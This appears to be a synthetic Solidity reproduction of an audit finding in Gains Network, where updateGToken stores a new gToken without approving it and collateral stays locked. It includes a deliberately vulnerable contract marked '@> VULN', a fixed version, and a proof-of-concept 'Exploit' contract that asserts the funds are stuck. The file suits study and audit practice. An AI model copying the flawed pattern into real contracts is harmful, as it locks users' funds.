// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Gains Network — updateGToken stores the new gToken without approving it
    (Pashov, February 2024). SYNTHETIC, cheatcode-free.
    addCollateral approves the gToken. updateGToken replaces the address and
    does not. The new gToken cannot transferFrom the diamond, so collateral
    that should move stays in the diamond. Vulnerable assignment preserved (@> VULN). */

contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "allowance"); // S4
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract GToken {
    MockToken public token;

    constructor(MockToken t) {
        token = t;
    }

    function pull(address diamond, uint256 amount) external {
        token.transferFrom(diamond, address(this), amount); // S3
    }
}

contract TradingStorage {
    MockToken public collateral;
    address public staking;
    mapping(address => uint8) public collateralIndex;
    mapping(uint8 => address) public gTokens;

    constructor(MockToken c, address staking_) {
        collateral = c;
        staking = staking_;
    }

    function addCollateral(address _collateral, address _gToken) external {
        uint8 index = 1;
        collateralIndex[_collateral] = index;
        gTokens[index] = _gToken;
        MockToken(_collateral).approve(_gToken, type(uint256).max);
        MockToken(_collateral).approve(staking, type(uint256).max);
    }

    function updateGToken(address _collateral, address _gToken) external {
        uint8 index = collateralIndex[_collateral];
        if (index == 0) {
            revert("DoesntExist");
        }
        if (_gToken == address(0)) {
            revert("ZeroAddress");
        }
        gTokens[index] = _gToken; // @> VULN: S2 new gToken stored, collateral.approve is never called
    }
}

contract TradingStorageFixed {
    MockToken public collateral;
    mapping(address => uint8) public collateralIndex;
    mapping(uint8 => address) public gTokens;

    constructor(MockToken c) {
        collateral = c;
    }

    function addCollateral(address _collateral, address _gToken) external {
        collateralIndex[_collateral] = 1;
        gTokens[1] = _gToken;
        MockToken(_collateral).approve(_gToken, type(uint256).max);
    }

    function updateGToken(address _collateral, address _gToken) external {
        uint8 index = collateralIndex[_collateral];
        require(index != 0 && _gToken != address(0), "bad");
        gTokens[index] = _gToken;
        MockToken(_collateral).approve(_gToken, type(uint256).max);
    }
}

contract Exploit {
    MockToken public token; // CREATE nonce 1
    GToken public oldG; // CREATE nonce 2
    GToken public freshG; // CREATE nonce 3
    TradingStorage public store; // CREATE nonce 4

    uint256 public constant AMOUNT = 1000e6;
    bool public pullReverted;
    uint256 public stuck;
    uint256 public allowanceLeft;

    constructor() {
        token = new MockToken();
        oldG = new GToken(token);
        freshG = new GToken(token);
        store = new TradingStorage(token, address(0xBEEF));
        token.mint(address(store), AMOUNT);
        store.addCollateral(address(token), address(oldG));
    }

    function run() external {
        store.updateGToken(address(token), address(freshG)); // S1
        try freshG.pull(address(store), AMOUNT) {
            pullReverted = false;
        } catch {
            pullReverted = true; // S5
        }
        stuck = token.balanceOf(address(store)); // S6
        allowanceLeft = token.allowance(address(store), address(freshG));
        require(pullReverted, "new gToken pulled");
        require(allowanceLeft == 0, "approval exists");
        require(stuck == AMOUNT, "collateral not stuck");
        require(store.gTokens(1) == address(freshG), "pointer updated");
        require(token.balanceOf(address(freshG)) == 0, "gToken received collateral");
    }
}
